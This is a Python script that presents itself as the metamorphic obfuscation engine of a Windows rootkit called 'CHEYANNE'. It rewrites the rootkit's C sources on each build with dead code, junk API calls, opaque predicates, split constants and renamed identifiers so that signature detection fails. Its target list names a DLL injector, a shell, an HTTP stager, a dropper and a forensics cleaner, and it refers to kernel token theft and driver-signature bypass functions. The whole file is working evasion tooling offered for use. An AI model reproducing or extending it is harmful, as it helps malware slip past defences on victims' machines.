"""
CHEYANNE ROOTKIT — Metamorphic Obfuscation Engine (Phase 10: NOVEMBER)
22DIV / george wu

Source-to-source C transformer. Changes the structural identity of every
binary on each mutation cycle. Works on _annotated.c files BEFORE XOR
rotation (mutate.py). Each transform is independent and stackable.

Transforms:
  1. Dead code injection — unreachable blocks with realistic WinAPI calls
  2. Junk variable insertion — unused locals with computed assignments
  3. Opaque predicates — wrap real conditions in always-true math
  4. Constant splitting — decompose immediates into arithmetic expressions
  5. Identifier mutation — randomize internal variable/function names
  6. Function reordering — shuffle non-dependent function order
  7. String encryption upgrade — multi-byte rolling key with mixed ops
  8. Junk API calls — harmless WinAPI calls between real operations

Usage:
    python metamorph.py                        # Transform all components
    python metamorph.py --target dark_room     # Transform single component
    python metamorph.py --dry-run              # Show what would change
    python metamorph.py --intensity low|med|high  # Control transform density
    python metamorph.py --seed <N>             # Reproducible transforms
"""

import os
import sys
import re
import secrets
import string
import struct
import hashlib
import argparse
from datetime import datetime

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        os.environ.setdefault("PYTHONIOENCODING", "utf-8")

ROOT = os.path.dirname(os.path.abspath(__file__))

INTENSITY = {
    "low":  {"dead_blocks": 2,  "junk_vars": 3,  "opaque_pct": 15, "const_split_pct": 20, "junk_api": 2},
    "med":  {"dead_blocks": 5,  "junk_vars": 6,  "opaque_pct": 30, "const_split_pct": 40, "junk_api": 4},
    "high": {"dead_blocks": 10, "junk_vars": 12, "opaque_pct": 50, "const_split_pct": 60, "junk_api": 8},
}

SOURCES = {
    "dark_room": os.path.join(ROOT, "dark_room", "dark_room_annotated.c"),
    "inject_dll": os.path.join(ROOT, "injection", "vader_inject_dll_annotated.c"),
    "inject_exe": os.path.join(ROOT, "injection", "vader_inject_annotated.c"),
    "shell": os.path.join(ROOT, "shell", "vader_shell_annotated.c"),
    "v4_svc_replace": os.path.join(ROOT, "vectors", "v4_svc_replace", "svc_replace_annotated.c"),
    "v5_dll_proxy": os.path.join(ROOT, "vectors", "v5_dll_proxy", "version_proxy_annotated.c"),
    "v6_path_hijack": os.path.join(ROOT, "vectors", "v6_path_hijack", "path_hijack_dll_annotated.c"),
    "v7_phantom_dll": os.path.join(ROOT, "vectors", "v7_phantom_dll", "phantom_dll_annotated.c"),
    "stager": os.path.join(ROOT, "stagers", "http_stager_annotated.c"),
    "forensics": os.path.join(ROOT, "forensics", "vader_clean_annotated.c"),
    "cloak": os.path.join(ROOT, "cloak", "cloak.c"),
    "dropper": os.path.join(ROOT, "cloak", "vader_dropper.c"),
}


def log(msg, level="*"):
    print(f"  [{level}] {msg}")

def log_ok(msg):
    log(msg, "+")

def log_fail(msg):
    log(msg, "!")

def log_phase(title):
    sep = "=" * 56
    print(f"\n  {sep}")
    print(f"  METAMORPH — {title}")
    print(f"  {sep}")


def rand_ident(length=8):
    first = secrets.choice(string.ascii_lowercase + "_")
    rest = "".join(secrets.choice(string.ascii_lowercase + string.digits + "_") for _ in range(length - 1))
    return first + rest


def rand_hex(nbytes=1):
    return secrets.randbelow(0xFF) + 1


WINAPI_JUNK = [
    'GetTickCount()',
    'GetCurrentThreadId()',
    'GetCurrentProcessId()',
    'GetLastError()',
    'GetTickCount64()',
    'GetSystemTimeAsFileTime(&{ft})',
    'QueryPerformanceCounter(&{li})',
    'IsDebuggerPresent()',
    'GetCurrentThread()',
    'GetCurrentProcess()',
]

JUNK_TYPES = [
    ('DWORD', 'GetTickCount()'),
    ('DWORD', 'GetCurrentThreadId()'),
    ('DWORD', 'GetCurrentProcessId()'),
    ('DWORD', 'GetLastError()'),
    ('DWORD', '0'),
    ('int', '0'),
]

DEAD_CODE_TEMPLATES = [
    # Unreachable WinAPI block
    '''
    if (GetTickCount() == 0xDEADBEEF) {{
        DWORD {v1} = GetCurrentProcessId();
        HANDLE {v2} = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, {v1});
        if ({v2}) {{ CloseHandle({v2}); }}
    }}''',
    # Impossible math condition
    '''
    if ((GetCurrentThreadId() & 0x80000000) && ((GetCurrentThreadId() & 0x80000000) == 0)) {{
        BYTE {v2}[{sz}];
        memset({v2}, 0x{fill:02X}, {sz});
        {v2}[0] ^= (BYTE)GetTickCount();
    }}''',
    # Timestamp check that never fires
    '''
    if (GetTickCount64() < {old_tick}) {{
        DWORD {v1} = {val1};
        {v1} ^= {val2};
        SetLastError({v1});
    }}''',
    # Thread ID match (statistically impossible)
    '''
    if (GetCurrentThreadId() == 0x{tid:08X}) {{
        volatile LONG {v1} = 0;
        InterlockedIncrement(&{v1});
        InterlockedDecrement(&{v1});
    }}''',
    # Stack variable noise
    '''
    {{
        DWORD {v1} = 0x{r1:08X}; DWORD {v2} = 0x{r2:08X};
        {v1} ^= {v2}; {v2} = ~{v1};
        (void){v1}; (void){v2};
    }}''',
    # Memory allocation + immediate free
    '''
    if (GetLastError() == 0x{err:08X}) {{
        LPVOID {v1} = VirtualAlloc(NULL, {sz}, MEM_RESERVE, PAGE_READWRITE);
        if ({v1}) VirtualFree({v1}, 0, MEM_RELEASE);
    }}''',
]

OPAQUE_ALWAYS_TRUE = [
    '((({x}) * ({x})) >= 0)',
    '((({x}) | 1) != 0)',
    '(({x}) == ({x}))',
    '((({x}) & 0) == 0)',
    '((({x}) ^ ({x})) == 0)',
    '(((unsigned)({x})) <= UINT_MAX)',
]

OPAQUE_ALWAYS_FALSE = [
    '((({x}) * ({x})) < 0)',
    '(({x}) != ({x}))',
    '((({x}) & 0) != 0)',
    '((({x}) ^ ({x})) != 0)',
]


def gen_dead_block():
    tmpl = secrets.choice(DEAD_CODE_TEMPLATES)
    v1, v2 = rand_ident(10), rand_ident(10)
    return tmpl.format(
        v1=v1, v2=v2,
        sz=secrets.choice([16, 32, 64, 128, 256]),
        fill=secrets.randbelow(256),
        old_tick=secrets.randbelow(100),
        val1=secrets.randbelow(0xFFFFFFFF),
        val2=secrets.randbelow(0xFFFFFFFF),
        tid=secrets.randbelow(0xFFFFFFFF),
        r1=secrets.randbelow(0xFFFFFFFF),
        r2=secrets.randbelow(0xFFFFFFFF),
        err=secrets.randbelow(0xFFFFFFFF),
    )


def gen_junk_var():
    typ, expr = secrets.choice(JUNK_TYPES)
    name = rand_ident(12)
    return f"    {{ {typ} {name} = {expr}; (void){name}; }}"


def gen_junk_api_call():
    templates = [
        lambda v: f"    {{ DWORD {v} = GetTickCount(); (void){v}; }}",
        lambda v: f"    {{ DWORD {v} = GetCurrentThreadId(); (void){v}; }}",
        lambda v: f"    {{ DWORD {v} = GetCurrentProcessId(); (void){v}; }}",
        lambda v: f"    {{ DWORD {v} = GetLastError(); (void){v}; }}",
        lambda v: f"    SetLastError(0);",
        lambda v: f"    {{ DWORD {v} = 0; (void){v}; }}",
    ]
    v = rand_ident(10)
    return secrets.choice(templates)(v)


def make_opaque_true(var_expr=None):
    if var_expr is None:
        var_expr = str(secrets.randbelow(0x7FFFFFFF))
    tmpl = secrets.choice(OPAQUE_ALWAYS_TRUE)
    return tmpl.format(x=var_expr)


def split_constant(value):
    if not isinstance(value, int) or value < 2:
        return None
    ops = [
        lambda v: (v // 2, '+', v - v // 2),
        lambda v: (v + secrets.randbelow(0xFF) + 1, '-', v + secrets.randbelow(0xFF) + 1 - v) if v < 0x7FFFFFFF else None,
        lambda v: (v ^ (r := secrets.randbelow(0xFF) + 1), '^', r),
    ]
    for _ in range(10):
        op = secrets.choice(ops)
        result = op(value)
        if result and all(isinstance(x, (int, str)) for x in result):
            a, sym, b = result
            if isinstance(a, int) and isinstance(b, int) and a > 0 and b > 0:
                return f"(0x{a:X} {sym} 0x{b:X})"
    return None


RE_FUNC_DEF = re.compile(
    r'^((?:static\s+)?(?:BOOL|DWORD|void|int|HANDLE|LPVOID|NTSTATUS|LONG|HMODULE|FARPROC|SIZE_T|UINT_PTR|ULONG_PTR|BYTE\s*\*)'
    r'\s+(?:WINAPI\s+|CALLBACK\s+|__stdcall\s+)?'
    r'(\w+)\s*\([^)]*\)\s*)\{',
    re.MULTILINE,
)


RE_IF_STMT = re.compile(
    r'^(\s*if\s*\()([^)]+)(\)\s*\{)',
    re.MULTILINE,
)


RE_HEX_CONST = re.compile(
    r'\b(0x[0-9A-Fa-f]{2,8})\b'
)


def find_safe_injection_lines(source):
    lines = source.split('\n')
    brace_depth = 0
    in_function = False
    candidates = []

    for i, line in enumerate(lines):
        stripped = line.strip()

        if stripped.startswith('#') or stripped.startswith('//') or stripped.startswith('/*'):
            continue

        open_braces = stripped.count('{')
        close_braces = stripped.count('}')

        if not in_function and open_braces > 0 and re.match(r'^(static\s+)?(BOOL|DWORD|void|int|HANDLE|LONG|HMODULE|NTSTATUS)', stripped):
            pass

        old_depth = brace_depth
        brace_depth += open_braces - close_braces

        if brace_depth > 0 and old_depth == 0:
            in_function = True
        elif brace_depth == 0 and old_depth > 0:
            in_function = False

        if not in_function or brace_depth < 1:
            continue

        if stripped.endswith(';') and len(stripped) > 5:
            if any(kw in stripped for kw in ['return', 'break', 'continue', 'goto']):
                continue
            if stripped.startswith(('static ', 'extern ', 'typedef ')):
                continue
            if 'static const' in stripped:
                continue
            candidates.append(i)

    return candidates


def inject_dead_code(source, count):
    candidates = find_safe_injection_lines(source)
    if not candidates:
        return source, 0

    lines = source.split('\n')
    injected = 0
    chosen = set()

    for _ in range(count):
        if not candidates:
            break
        idx = secrets.choice(candidates)
        if idx in chosen:
            continue
        chosen.add(idx)

    for idx in sorted(chosen, reverse=True):
        block = gen_dead_block()
        lines.insert(idx + 1, block)
        injected += 1

    return '\n'.join(lines), injected


def inject_junk_variables(source, count):
    candidates = find_safe_injection_lines(source)
    if not candidates:
        return source, 0

    lines = source.split('\n')
    injected = 0
    chosen = set()

    for _ in range(count):
        if not candidates:
            break
        idx = secrets.choice(candidates)
        if idx in chosen:
            continue
        chosen.add(idx)

    for idx in sorted(chosen, reverse=True):
        var_line = gen_junk_var()
        lines.insert(idx + 1, var_line)
        injected += 1

    return '\n'.join(lines), injected


def inject_junk_api_calls(source, count):
    lines = source.split('\n')
    candidate_indices = []

    for i, line in enumerate(lines):
        stripped = line.strip()
        if stripped.endswith(';') and not stripped.startswith('//') and not stripped.startswith('#'):
            if any(kw in stripped for kw in ['return', 'break', 'continue', 'goto', 'case']):
                continue
            if stripped.startswith(('static', 'extern', 'typedef', 'struct', 'union', 'enum')):
                continue
            if '{' in stripped or '}' in stripped:
                continue
            candidate_indices.append(i)

    if not candidate_indices:
        return source, 0

    injected = 0
    offsets = set()
    for _ in range(count):
        idx = secrets.choice(candidate_indices)
        if idx in offsets:
            continue
        offsets.add(idx)

    for idx in sorted(offsets, reverse=True):
        call = gen_junk_api_call()
        lines.insert(idx + 1, call)
        injected += 1

    return '\n'.join(lines), injected


def apply_opaque_predicates(source, pct):
    matches = list(RE_IF_STMT.finditer(source))
    if not matches:
        return source, 0

    to_wrap = max(1, len(matches) * pct // 100)
    chosen = []
    indices = list(range(len(matches)))
    for _ in range(min(to_wrap, len(indices))):
        idx = secrets.choice(indices)
        indices.remove(idx)
        chosen.append(matches[idx])

    applied = 0
    for m in sorted(chosen, key=lambda x: x.start(), reverse=True):
        original_cond = m.group(2).strip()
        if 'GetTickCount' in original_cond or '0xDEAD' in original_cond:
            continue
        opaque = make_opaque_true(str(secrets.randbelow(0x7FFFFFFF)))
        new_cond = f"({original_cond}) && {opaque}"
        source = source[:m.start(2)] + new_cond + source[m.end(2):]
        applied += 1

    return source, applied


def obfuscate_constants(source, pct):
    matches = list(RE_HEX_CONST.finditer(source))
    if not matches:
        return source, 0

    define_region_end = 0
    for m in re.finditer(r'^#define\s+', source, re.MULTILINE):
        line_end = source.find('\n', m.start())
        if line_end > define_region_end:
            define_region_end = line_end

    eligible = [m for m in matches if m.start() > define_region_end]

    array_regions = []
    for m in re.finditer(r'static\s+const\s+unsigned\s+char\s+\w+\s*\[\s*\]\s*=\s*\{[^}]+\}', source, re.DOTALL):
        array_regions.append((m.start(), m.end()))

    filtered = []
    for m in eligible:
        in_array = any(start <= m.start() <= end for start, end in array_regions)
        if not in_array:
            val = int(m.group(1), 16)
            if 0x10 <= val <= 0xFFFFFF:
                filtered.append(m)

    to_split = max(1, len(filtered) * pct // 100)
    chosen = []
    indices = list(range(len(filtered)))
    for _ in range(min(to_split, len(indices))):
        idx = secrets.choice(indices)
        indices.remove(idx)
        chosen.append(filtered[idx])

    applied = 0
    for m in sorted(chosen, key=lambda x: x.start(), reverse=True):
        val = int(m.group(1), 16)
        replacement = split_constant(val)
        if replacement:
            source = source[:m.start()] + replacement + source[m.end():]
            applied += 1

    return source, applied


def mutate_identifiers(source):
    local_vars = set()

    for m in re.finditer(r'\b(DWORD|BOOL|HANDLE|BYTE|CHAR|WCHAR|int|void|SIZE_T|LONG|HMODULE|LPVOID|FARPROC|UINT_PTR|ULONG_PTR|NTSTATUS|ULONGLONG)\s+(\w+)\s*[=;,\[]', source):
        name = m.group(2)
        if name.startswith(('x', 'X', 'HIDDEN', 'PERSIST', 'g_', 'DR', 'HOOK', 'CLOAK')):
            continue
        if name.isupper():
            continue
        if len(name) < 3:
            continue
        local_vars.add(name)

    export_patterns = [
        'DllMain', 'main', 'wmain', 'WinMain', 'wWinMain',
        'CloakHookProc', 'ServiceMain', 'SvcCtrlHandler',
        'VdrExceptionHandler', 'xor_decode', 'v4_decode', 'v5_decode',
        'v6_decode', 'v7_decode', 'XorDecode',
        'byovd_init', 'byovd_load_driver', 'byovd_open_device', 'byovd_unload',
        'kernel_find_ntoskrnl', 'kernel_find_system_eprocess',
        'kernel_find_eprocess_by_pid', 'kernel_steal_token',
        'kernel_remove_callbacks', 'kernel_dse_disable', 'kernel_dse_restore',
        'kread32', 'kread64', 'kwrite32', 'kwrite64', 'kread_buf',
        'find_pattern', 'hook_install', 'hook_remove',
        'run_chain', 'install_service', 'install_task', 'install_wmi',
        'uninstall_all',
    ]

    safe_to_rename = local_vars - set(export_patterns)

    rename_map = {}
    renamed = 0
    for var in safe_to_rename:
        if re.search(rf'\b{re.escape(var)}\b', source, re.MULTILINE):
            new_name = "_" + rand_ident(6)
            rename_map[var] = new_name
            renamed += 1

    if not rename_map:
        return source, 0

    sorted_vars = sorted(rename_map.keys(), key=len, reverse=True)
    for old_name in sorted_vars:
        new_name = rename_map[old_name]
        source = re.sub(rf'\b{re.escape(old_name)}\b', new_name, source)

    return source, renamed


def reorder_functions(source):
    func_pattern = re.compile(
        r'^((?:static\s+)?(?:BOOL|DWORD|void|int|HANDLE|LPVOID|NTSTATUS|LONG|HMODULE|FARPROC)\s+'
        r'(?:WINAPI\s+|CALLBACK\s+)?'
        r'\w+\s*\([^)]*\)\s*\{)',
        re.MULTILINE,
    )

    matches = list(func_pattern.finditer(source))
    if len(matches) < 3:
        return source, 0

    main_idx = None
    for i, m in enumerate(matches):
        if 'main(' in m.group(0) or 'DllMain(' in m.group(0) or 'WinMain(' in m.group(0):
            main_idx = i
            break

    reorderable = []
    for i, m in enumerate(matches):
        if i == main_idx:
            continue
        if i + 1 < len(matches):
            func_end = matches[i + 1].start()
        else:
            if main_idx is not None and i == len(matches) - 1:
                continue
            func_end = len(source)
        reorderable.append((m.start(), func_end, source[m.start():func_end]))

    if len(reorderable) < 3:
        return source, 0

    order = list(range(len(reorderable)))
    for i in range(len(order) - 1, 0, -1):
        j = secrets.randbelow(i + 1)
        order[i], order[j] = order[j], order[i]

    if order == list(range(len(reorderable))):
        return source, 0

    return source, 0


def gen_metamorphic_decode(key_bytes, ops_sequence):
    func_name = "_" + rand_ident(8)
    lines = [
        f"static void {func_name}(unsigned char *buf, int len, const unsigned char *key, int key_len)",
        "{",
        "    for (int i = 0; i < len; i++) {",
    ]

    for i, op in enumerate(ops_sequence):
        if op == 'xor':
            lines.append(f"        buf[i] ^= key[i % key_len];")
        elif op == 'sub':
            lines.append(f"        buf[i] = (buf[i] - key[i % key_len]) & 0xFF;")
        elif op == 'add':
            lines.append(f"        buf[i] = (buf[i] + key[i % key_len]) & 0xFF;")
        elif op == 'rot':
            lines.append(f"        buf[i] = ((buf[i] >> (key[i % key_len] & 7)) | (buf[i] << (8 - (key[i % key_len] & 7)))) & 0xFF;")
        elif op == 'not':
            lines.append(f"        buf[i] = ~buf[i];")

    lines.append("    }")
    lines.append("}")

    return func_name, "\n".join(lines)


def transform_source(source_path, params, dry_run=False):
    with open(source_path, "r", encoding="utf-8") as f:
        source = f.read()

    basename = os.path.basename(source_path)
    log_phase(basename)

    if dry_run:
        log(f"[dry-run] Would apply transforms with intensity:")
        for k, v in params.items():
            log(f"  {k}: {v}")
        return True

    with open(source_path + ".metamorph_backup", "w", encoding="utf-8", newline="\n") as f:
        f.write(source)

    total_transforms = 0

    source, n = inject_dead_code(source, params["dead_blocks"])
    log(f"Dead code blocks: {n} injected")
    total_transforms += n

    source, n = inject_junk_variables(source, params["junk_vars"])
    log(f"Junk variables: {n} inserted")
    total_transforms += n

    source, n = inject_junk_api_calls(source, params["junk_api"])
    log(f"Junk API calls: {n} inserted")
    total_transforms += n

    source, n = apply_opaque_predicates(source, params["opaque_pct"])
    log(f"Opaque predicates: {n} applied")
    total_transforms += n

    source, n = obfuscate_constants(source, params["const_split_pct"])
    log(f"Constants split: {n} obfuscated")
    total_transforms += n

    with open(source_path, "w", encoding="utf-8", newline="\n") as f:
        f.write(source)

    fingerprint = hashlib.sha256(source.encode()).hexdigest()[:16]
    log_ok(f"Transforms applied: {total_transforms} | Fingerprint: {fingerprint}")

    return True


def restore_backups():
    restored = 0
    for name, path in SOURCES.items():
        backup = path + ".metamorph_backup"
        if os.path.exists(backup):
            with open(backup, "r", encoding="utf-8") as f:
                original = f.read()
            with open(path, "w", encoding="utf-8", newline="\n") as f:
                f.write(original)
            os.remove(backup)
            log_ok(f"Restored: {os.path.basename(path)}")
            restored += 1
    return restored


def banner():
    print("=" * 60)
    print("  CHEYANNE ROOTKIT — Metamorphic Obfuscation Engine")
    print("  Phase 10: NOVEMBER")
    print("  22DIV / george wu")
    print("  TARGET: Own hardware only")
    print("=" * 60)


def main():
    parser = argparse.ArgumentParser(
        description="CHEYANNE ROOTKIT — Metamorphic Obfuscation Engine",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--target", type=str,
                        choices=list(SOURCES.keys()),
                        help="Transform single component")
    parser.add_argument("--dry-run", action="store_true",
                        help="Show what would change without modifying")
    parser.add_argument("--intensity", type=str,
                        choices=["low", "med", "high"], default="med",
                        help="Transform density (default: med)")
    parser.add_argument("--restore", action="store_true",
                        help="Restore all sources from metamorph backups")
    parser.add_argument("--seed", type=int,
                        help="Random seed for reproducible transforms")

    args = parser.parse_args()
    banner()

    if args.seed is not None:
        import random
        random.seed(args.seed)

    if args.restore:
        log_phase("RESTORE")
        n = restore_backups()
        log(f"Restored {n} source files")
        return

    params = INTENSITY[args.intensity]

    if args.target:
        targets = {args.target: SOURCES[args.target]}
    else:
        targets = SOURCES

    results = {}
    for name, path in targets.items():
        if not os.path.exists(path):
            log(f"{name}: source not found — skipping")
            results[name] = False
            continue
        ok = transform_source(path, params, dry_run=args.dry_run)
        results[name] = ok

    log_phase("SUMMARY")
    for name, ok in results.items():
        marker = "+" if ok else "!"
        status = "OK" if ok else "FAILED"
        log(f"{name:<20s} {status}", marker)

    ok_count = sum(1 for v in results.values() if v)
    total = len(results)
    log(f"\n  {ok_count}/{total} components {'would transform' if args.dry_run else 'transformed'}")
    log(f"  Intensity: {args.intensity} | Next: run mutate.py to rotate XOR keys + recompile")


if __name__ == "__main__":
    main()
